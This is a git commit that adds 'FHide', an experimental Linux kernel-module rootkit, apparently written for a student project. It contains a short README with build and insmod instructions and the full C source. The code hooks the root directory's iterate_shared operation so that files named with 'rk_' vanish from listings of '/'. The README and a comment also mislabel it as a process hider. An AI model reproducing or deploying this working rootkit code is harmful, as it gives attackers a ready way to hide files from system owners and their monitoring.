7e0ebeaa173d54fe18d25a52c0d78a2aaf4ad49f
Yassine Tioual <yassine.tioual@telecom-sudparis.eu>
2017-04-15 17:44:20 +0200

    Add FHide rootkit

---
+++ fhide/README.md
@@ -0,0 +1,25 @@
+# PHide : Process Hider #
+
+This rootkit is similar to the
+[PHide](https://github.com/nisay759/linux-rootkits/tree/master/phide) rootkit.
+It hides files beginning with the prefix « rk_ » that are located on the root of
+the filesystem « / »
+
+## Compilation ##
+```
+	$ make
+```
+
+## Installation ##
+```
+	$ sudo insmod fhide.ko
+```
+
+## Removal ##
+```
+	$ sudo rmmod fhide
+```
+
+## Disclaimer ##
+
+This is an experimental rootkit. Use it at your own risks.
---
+++ fhide/fhide.c
@@ -0,0 +1,84 @@
+/*
+ * Experimental RootKit
+ * Simple RootKit for the EARL project
+ * Functionality : Hiding processes
+ */
+
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/namei.h>
+#include <linux/fs.h>
+
+#include <linux/proc_fs.h>
+
+static int __init fhide_init(void);
+static void __exit fhide_exit(void);
+
+module_init(fhide_init);
+module_exit(fhide_exit);
+
+static char *prefix = "rk_";
+struct file_operations proc_fops;
+const struct file_operations *backup_proc_fops;
+struct inode *proc_inode;
+
+struct dir_context *backup_ctx;
+
+static int rk_filldir_t(struct dir_context *ctx, const char *file_name, int len,
+        loff_t off, u64 ino, unsigned int d_type)
+{
+    if (strstr(file_name, prefix) != NULL)
+        return 0;
+
+    return backup_ctx->actor(backup_ctx, file_name, len, off, ino, d_type);
+}
+
+struct dir_context rk_ctx = {
+    .actor = rk_filldir_t,
+};
+
+int rk_iterate_shared(struct file *file, struct dir_context *ctx)
+{
+    int result = 0;
+    rk_ctx.pos = ctx->pos;
+    backup_ctx = ctx;
+    result = backup_proc_fops->iterate_shared(file, &rk_ctx);
+    ctx->pos = rk_ctx.pos;
+
+    return result;
+}
+
+static int __init fhide_init(void)
+{
+    printk(KERN_INFO "FHide: LKM succefully loaded!\n");
+    struct path p;
+
+    if(kern_path("/", 0, &p))
+        return 0;
+
+    proc_inode = p.dentry->d_inode;
+
+    proc_fops = *proc_inode->i_fop;
+    backup_proc_fops = proc_inode->i_fop;
+    proc_fops.iterate_shared = rk_iterate_shared;
+    proc_inode->i_fop = &proc_fops;
+
+    return 0;
+}
+
+static void __exit fhide_exit(void)
+{
+    struct path p;
+    struct inode *proc_inode;
+    if(kern_path("/", 0, &p))
+        return;
+    proc_inode = p.dentry->d_inode;
+    proc_inode->i_fop = backup_proc_fops;
+
+    printk(KERN_INFO "FHide: LKM succefully unloaded!\n");
+}
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Yassine Tioual");
+MODULE_VERSION("0.1");
